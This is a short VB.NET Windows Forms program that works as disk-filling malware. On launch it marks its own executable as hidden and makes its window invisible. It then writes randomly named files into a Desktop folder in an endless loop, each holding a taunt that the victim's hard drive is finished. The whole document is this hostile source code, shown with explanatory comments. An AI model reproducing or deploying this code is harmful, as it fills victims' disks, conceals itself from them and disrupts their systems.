Imports System.IO

Public Class Form1

    Function NombreRandom()
        Dim i As Integer
        Dim Nombre As String

        Nombre = 1

        For i = 1 To 10
            Nombre = Nombre & (Rnd() * 1)
        Next

        Return (Nombre)
    End Function

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim Ruta As String = "C:\Users\" & Environment.UserName() & "\Desktop\asd\"
        Dim Atributo As System.IO.FileAttributes = FileAttributes.Hidden

        File.SetAttributes(Application.ExecutablePath, Atributo)

        Me.Visible = False  'We hide the form

        If Dir(Ruta, vbDirectory) = "" Then 'Creation of the path in case if not exists
            MkDir(Ruta)
        End If

        While Me.Visible = False 'While the form is hidden iterate (always)
            Dim Archivo = File.Create(Ruta & NombreRandom())
            Dim Escritor As StreamWriter = New StreamWriter(Archivo)
            Escritor.Write("Say goodbye to your hard drive! hahaha") 'Message to write
            Escritor.Close()
        End While

    End Sub
End Class
